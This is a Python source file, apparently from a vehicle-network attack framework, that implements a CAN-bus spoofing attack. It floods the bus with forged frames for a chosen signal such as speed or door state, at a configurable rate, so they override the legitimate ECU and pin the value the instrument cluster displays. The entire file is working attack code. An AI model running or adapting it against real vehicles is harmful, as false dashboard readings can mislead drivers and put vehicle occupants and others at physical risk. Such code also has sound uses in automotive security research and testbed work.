"""
Spoofing attack: continuously re-send a forged value for a chosen signal
(e.g. "speed", "doors") so it overrides whatever the legitimate ECU/UI is
sending -- a live man-in-the-middle style override, not just a one-shot
replay. Since the instrument cluster decodes whatever arrives last, out-
spamming the legit writer effectively pins the value.
"""

import time

from can_bus import pack_uint
from vehicles.profiles import VehicleProfile


def run_spoof(attack, bus, profile: VehicleProfile) -> None:
    signal_name = attack.params.get("signal")
    value = attack.params.get("value")
    rate_hz = max(1, int(attack.params.get("rate_hz", 50)))
    duration = attack.params.get("duration")

    spec = profile.signals.get(signal_name)
    if spec is None:
        attack.log(f"unknown signal '{signal_name}' for profile '{profile.key}'")
        return

    if value is None:
        attack.log(f"no value given to spoof '{signal_name}' with")
        return

    packed = pack_uint(value, spec.length)
    frame = bytearray(8)
    frame[spec.byte:spec.byte + spec.length] = packed
    frame = bytes(frame)

    attack.log(
        f"spoofing '{signal_name}' = {value} on 0x{spec.arb_id:03X} @ {rate_hz}Hz"
    )

    interval = 1.0 / rate_hz
    start = time.time()
    while not attack.stop_event.is_set():
        if duration is not None and (time.time() - start) >= float(duration):
            break
        bus.send(spec.arb_id, frame)
        attack.note_frame(spec.arb_id, frame)
        attack.stop_event.wait(interval)

    attack.log(f"spoof of '{signal_name}' stopped")
